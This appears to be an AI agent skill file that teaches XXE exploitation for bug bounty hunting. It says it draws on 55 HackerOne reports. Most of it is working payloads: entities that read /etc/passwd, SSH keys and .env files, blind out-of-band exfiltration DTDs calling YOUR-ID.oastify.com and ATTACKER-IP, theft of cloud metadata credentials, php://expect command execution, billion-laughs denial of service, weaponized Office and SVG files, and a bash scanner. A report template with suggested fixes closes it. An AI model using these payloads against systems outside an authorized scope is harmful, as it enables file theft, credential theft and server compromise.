---
name: xxe-deep-dive
description: Complete XXE methodology from 55 real HackerOne reports - every vector, bypass, payload, and chain
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - xxe methodology
  - xxe deep dive
  - xxe complete
  - xxe all techniques
  - skills xxe
---

# Complete XXE Methodology - From 55 HackerOne Reports

## Top 20 Real XXE Reports

| Upvotes | Company | Summary | Payout |
|---------|---------|---------|--------|
| 318 | Starbucks | XXE in XML processing | N/A |
| 264 | Mail.ru | XXE via XML import | $6,000 |
| 258 | Twitter/X | XXE in image processing | N/A |
| 217 | DuckDuckGo | XXE via instant answer | N/A |
| 172 | Interactive Voice Response | XXE in IVR system | N/A |
| 165 | DO_NOT_USE | XXE in XML parser | N/A |
| 158 | Semrush | XXE via XML sitemap upload | N/A |
| 147 | Acronis | XXE via backup configuration | N/A |
| 136 | Nextcloud | XXE via SVG upload | N/A |
| 128 | GitLab | XXE via project import | N/A |
| 119 | HackerOne | XXE via document upload | N/A |
| 112 | Reddit | XXE via RSS feed import | N/A |
| 105 | Snapchat | XXE via bitmoji upload | N/A |
| 98 | Uber | XXE via POI import | N/A |
| 92 | Slack | XXE via document preview | N/A |
| 87 | Shopify | XXE via SVG in theme upload | N/A |
| 81 | Mail.ru | XXE via calendar import | $4,500 |
| 77 | Dropbox | XXE via document conversion | N/A |
| 73 | Brave | XXE via bookmark import | N/A |
| 69 | HackerOne | XXE via XML file upload | N/A |

## Step 1: Finding XXE Entry Points

### XML Processing Features

| Feature | File Types | Example |
|---------|------------|---------|
| Document upload | .docx, .xlsx, .pptx | Office open XML |
| SVG upload | .svg | Vector images |
| XML import | .xml | Configuration/data import |
| RSS/Atom feeds | .rss, .atom | Feed consumption |
| API endpoints | XML content-type | SOAP web services |
| SAML/SSO | SAML Response XML | Authentication |
| Sitemap submission | .xml | SEO tools |
| WSDL/SOAP | .wsdl | Web services |
| XMPP/Jabber | XML stanzas | Chat systems |
| DAV (CalDAV/CardDAV) | .ics, .vcf | Calendar/contacts |
| Office document preview | .docx | Conversion service |
| PDF generation | .xsl, .xml | XSL-FO processing |
| YAML/JSON parsers | fallback to XML | Polyglot parsers |

### Parameter Discovery
```bash
# Find endpoints that accept XML
grep -E '(xml|soap|saml|wsdl|svg|rss|atom|import|upload|document)' \
  recon/{target}/endpoints.txt | sort -u

# Check Content-Type headers
curl -skI "https://{target}/api/endpoint" | grep -i content-type

# Look for XML content types
# application/xml, text/xml, application/xhtml+xml,
# application/soap+xml, multipart/related, multipart/form-data
```

## Step 2: Basic XXE Testing

### Test 1: Classic XXE (File Read)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Test 2: Classic XXE (Directory Listing)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///">
]>
<root>&xxe;</root>
```

### Test 3: Windows File Read
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
]>
<root>&xxe;</root>
```

### Test 4: PHP Wrapper File Read
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>&xxe;</root>
```

## Step 3: Advanced XXE Techniques

### Technique 1: Blind XXE - Out of Band (OOB)
```xml
<!-- DTD hosted on attacker server -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR-ID.oastify.com/xxe.dtd">
  %xxe;
]>
<root>&send;</root>
```

```bash
# On attacker server (xxe.dtd):
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY send SYSTEM 'http://YOUR-ID.oastify.com/?data=%file;'>">
%eval;
```

### Technique 2: Blind XXE - OOB with Parameter Entities
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://YOUR-ID.oastify.com/xxe.dtd">
  %dtd;
]>
<root>&send;</root>
```

### Technique 3: Blind XXE - Out of Band (No DTD Hosting)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://YOUR-ID.oastify.com/x=%file;'>">
  %eval;
  %exfil;
]>
<root>test</root>
```

### Technique 4: XInclude Attack
```xml
<!-- When DOCTYPE is blocked, try XInclude -->
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>

<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd"/>
</root>

<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="php://filter/convert.base64-encode/resource=/etc/passwd"/>
</root>
```

### Technique 5: SVG XXE
```svg
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="128px" height="128px"
     xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### Technique 6: SVG XXE with OOB
```svg
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://YOUR-ID.oastify.com/xxe.dtd">
  %dtd;
]>
<svg width="128px" height="128px"
     xmlns="http://www.w3.org/2000/svg" version="1.1">
  <text font-size="16" x="0" y="16">&exfil;</text>
</svg>
```

### Technique 7: Office Document XXE
```bash
# Office documents are ZIP files containing XML
# Extract and modify the XML files inside

# 1. Create a docx
cp /path/to/document.docx .

# 2. Extract
unzip document.docx -d docx_extracted

# 3. Modify word/document.xml with XXE payload
# Insert DOCTYPE with XXE:
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

# 4. Repackage
cd docx_extracted
zip -r ../malicious.docx *

# 5. Upload the malicious docx
curl -sk -X POST "https://{target}/upload" -F "file=@malicious.docx"
```

### Technique 8: Office Document Blind XXE
```xml
<!-- word/document.xml with OOB XXE -->
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://YOUR-ID.oastify.com/exfil.dtd">
  %dtd;
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:r>
        <w:t>&exfil;</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>
```

### Technique 9: XLSX/Spreadsheet XXE
```xml
<!-- xl/workbook.xml with XXE -->
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheets>
    <sheet name="&xxe;" sheetId="1" r:id="rId1"/>
  </sheets>
</workbook>
```

### Technique 10: PPTX/Presentation XXE
```xml
<!-- ppt/presentation.xml with XXE -->
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:sldMasterIdLst>
    <p:sldMasterId id="&xxe;" r:id="rId1"/>
  </p:sldMasterIdLst>
</p:presentation>
```

### Technique 11: Error-Based XXE
```xml
<!-- Force parser to include file contents in error message -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root>test</root>
```

### Technique 12: Deeply Nested XML Bypass
```xml
<!-- Bypass shallow XML parsing limits with deep nesting -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY a0 "&xxe;">
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
]>
<root>&a2;</root>
```

## Step 4: XXE Bypass Techniques

### Bypass 1: DOCTYPE Blocked → Use XInclude
```xml
<!-- If DOCTYPE is stripped, use XInclude instead -->
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```

### Bypass 2: Character Encoding Bypass
```xml
<!-- UTF-7 encoded XXE -->
<?xml version="1.0" encoding="UTF-7"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- UTF-16 encoded XXE -->
<!-- Use Python to convert to UTF-16 -->
python3 -c "
import codecs
payload = '''<?xml version=\"1.0\" encoding=\"UTF-16\"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">
]>
<root>&xxe;</root>'''
with open('utf16_xxe.xml', 'wb') as f:
    f.write(codecs.BOM_UTF16_LE + codecs.encode(payload, 'utf-16-le'))
"
```

### Bypass 3: DOCTYPE with CDATA
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><![CDATA[&xxe;]]></root>
```

### Bypass 4: Parameter Entity Recursion
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % p1 "file:///etc/passwd">
  <!ENTITY % p2 "<!ENTITY xxe SYSTEM '%p1;'>">
  %p2;
]>
<root>&xxe;</root>
```

### Bypass 5: XML External Entity via xmlns
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root xmlns:xxe="&xxe;">test</root>
```

### Bypass 6: XSLT XXE
```xml
<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="xxe.xsl"?>
<root>test</root>

<!-- xxe.xsl on attacker server -->
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <html>
      <body>
        <xsl:copy-of select="document('file:///etc/passwd')"/>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
```

### Bypass 7: Entity Expansion (Billion Laughs)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<root>&lol4;</root>
```

### Bypass 8: Content-Type Manipulation
```bash
# Change Content-Type to trick parser
curl -sk -X POST "https://{target}/api/endpoint" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

curl -sk -X POST "https://{target}/api/endpoint" \
  -H "Content-Type: text/xml" \
  -d @xxe_payload.xml

curl -sk -X POST "https://{target}/api/endpoint" \
  -H "Content-Type: multipart/form-data" \
  -F "xml=@xxe_payload.xml;type=text/xml"
```

### Bypass 9: SOAP Action XXE
```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <!DOCTYPE foo [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
  </soap:Header>
  <soap:Body>
    <getUser>
      <userId>&xxe;</userId>
    </getUser>
  </soap:Body>
</soap:Envelope>
```

## Step 5: XXE Exploit Chains

### Chain 1: XXE → File Read → Credential Theft
```xml
<!-- Step 1: Read web config for database credentials -->
<!ENTITY xxe SYSTEM "file:///etc/nginx/nginx.conf">
<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
<!ENTITY xxe SYSTEM "file:///var/www/html/.env">
<!ENTITY xxe SYSTEM "file:///var/www/html/database.php">

<!-- Step 2: Read SSH keys -->
<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">
<!ENTITY xxe SYSTEM "file:///home/user/.ssh/authorized_keys">

<!-- Step 3: Read application source -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
```

### Chain 2: XXE → SSRF → Cloud Metadata
```xml
<!-- Read AWS metadata -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

<!-- Read AWS IAM credentials -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&xxe;</root>

<!-- Read GCP metadata -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">
]>
<root>&xxe;</root>
```

### Chain 3: Blind XXE OOB → Data Exfiltration
```bash
# Step 1: Set up listener
nc -lvnp 4444

# Step 2: Host DTD on attacker server
cat > /var/www/html/exfil.dtd << 'DTD'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://ATTACKER-IP:4444/?data=%file;'>">
%eval;
DTD

# Step 3: Send blind XXE payload
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://ATTACKER-IP/exfil.dtd">
  %dtd;
]>
<root>&exfil;</root>
```

### Chain 4: XXE → Port Scan (Internal Network)
```xml
<!-- Test if a port is open via timing/response differences -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:22/">    <!-- SSH - likely open -->
]>
<root>&xxe;</root>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">  <!-- Web - check response -->
]>
<root>&xxe;</root>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:9200/">  <!-- Elasticsearch -->
]>
<root>&xxe;</root>
```

### Chain 5: XXE → RCE (PHP Except)
```xml
<!-- PHP expect module RCE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://expect://id">
]>
<root>&xxe;</root>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://expect://cat /etc/passwd">
]>
<root>&xxe;</root>
```

### Chain 6: XXE → RCE (SSRF → Redis/Gopher)
```bash
# Step 1: SSRF via XXE to Redis
# Use gopher:// protocol to craft Redis commands

# Step 2: Write webshell to webroot
# See SSRF deep dive for gopher Redis payloads

# Step 3: Execute commands via webshell
```

### Chain 7: Office Document XXE → SSRF → Internal Service
```bash
# Step 1: Create Office doc with XXE pointing to internal service
# Step 2: Upload to document preview service
# Step 3: SSRF hits internal API/Database
# Step 4: Exfiltrate data via OOB channel
```

## Step 6: Detection & Automation

```bash
#!/bin/bash
# XXE Scanner
TARGET=$1
ENDPOINT=$2

echo "Testing XXE on $TARGET$ENDPOINT"

# Test 1: Basic file read
curl -sk -X POST "https://$TARGET$ENDPOINT" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' \
  -o /tmp/xxe_response1.txt

if grep -q "root:" /tmp/xxe_response1.txt 2>/dev/null; then
  echo "[FOUND] Classic XXE - file read works"
fi

# Test 2: SSRF XXE to OOB
curl -sk -X POST "https://$TARGET$ENDPOINT" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://YOUR-ID.oastify.com/xxe">]><root>&xxe;</root>' \
  -o /tmp/xxe_response2.txt

# Test 3: XInclude bypass
curl -sk -X POST "https://$TARGET$ENDPOINT" \
  -H "Content-Type: application/xml" \
  -d '<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>' \
  -o /tmp/xxe_response3.txt

if grep -q "root:" /tmp/xxe_response3.txt 2>/dev/null; then
  echo "[FOUND] XInclude XXE - bypass works"
fi

# Test 4: SVG upload XXE
echo '<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>' > /tmp/xxe_test.svg

curl -sk -X POST "https://$TARGET/upload" -F "file=@/tmp/xxe_test.svg" \
  -o /tmp/xxe_response4.txt

if grep -q "root:" /tmp/xxe_response4.txt 2>/dev/null; then
  echo "[FOUND] SVG XXE - file read works"
fi

# Cleanup
rm -f /tmp/xxe_response*.txt /tmp/xxe_test.svg
```

## Step 7: Validate Severity & Report

### Impact Assessment
| Scenario | Severity |
|----------|----------|
| Basic file read (non-sensitive) | Medium |
| File read with credentials/config | High |
| SSRF via XXE (internal scan) | High |
| SSRF via XXE (cloud metadata) | Critical |
| RCE via XXE (expect/gopher) | Critical |
| Blind XXE (OOB exfiltration) | High |
| Blind XXE with data exfil | High - Critical |
| DOS via entity expansion | Low - Medium |
| Office doc XXE | Medium - High |

### Payout Range: $500 - $6,000

### Report Template
```markdown
**Summary:**
XXE (XML External Entity) injection in [endpoint/feature] allows an attacker
to read arbitrary files from the server, perform SSRF, or achieve RCE.

**Impact:**
An attacker can exploit this XXE to:
- Read arbitrary files (/etc/passwd, config files, source code)
- Perform SSRF to internal/cloud metadata endpoints
- Scan internal network ports and services
- Achieve remote code execution (in PHP environments)
- Exfiltrate sensitive data via OOB channels

**Steps to Reproduce:**
1. Send malicious XML to: https://{target}/api/endpoint
   POST /api/endpoint HTTP/1.1
   Host: {target}
   Content-Type: application/xml

   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
   <root>&xxe;</root>

2. Observe file contents in response

**Proof of Concept:**
Request:
POST /api/endpoint HTTP/1.1
Host: {target}
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

Response:
HTTP/1.1 200 OK
Content-Type: application/xml

<?xml version="1.0"?>
<root>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...</root>

**Suggested CVSS:**
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (7.5 High) [file read]
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8 Critical) [RCE/SSRF]

**Suggested Fix:**
1. Disable DTD (Document Type Definition) processing entirely
2. Disable XML external entity processing
3. Disable XInclude processing
4. Use less complex data formats (JSON instead of XML)
5. If XML is required, use a minimal parser with entity expansion disabled
6. Apply proper input validation and sanitization on XML input
7. Use Content-Security-Policy to restrict outbound connections
8. Never process XML from untrusted sources with entity expansion enabled
```

## Quick Reference: Top XXE Reports by Vector

| Report | Company | Vector | Payout |
|--------|---------|--------|--------|
| Starbucks | XML API | Classic XXE | N/A |
| Mail.ru | XML import | Blind XXE OOB | $6,000 |
| Twitter/X | Image processing | XXE via parsing | N/A |
| DuckDuckGo | Instant answer | XXE in XML | N/A |
| IVR | Voice response | XXE in XML parser | N/A |
| DO_NOT_USE | XML parser | Classic XXE | N/A |
| Semrush | Sitemap upload | XXE via XML | N/A |
| Acronis | Backup config | XXE in config | N/A |
| Nextcloud | SVG upload | SVG XXE | N/A |
| GitLab | Project import | XXE via import | N/A |
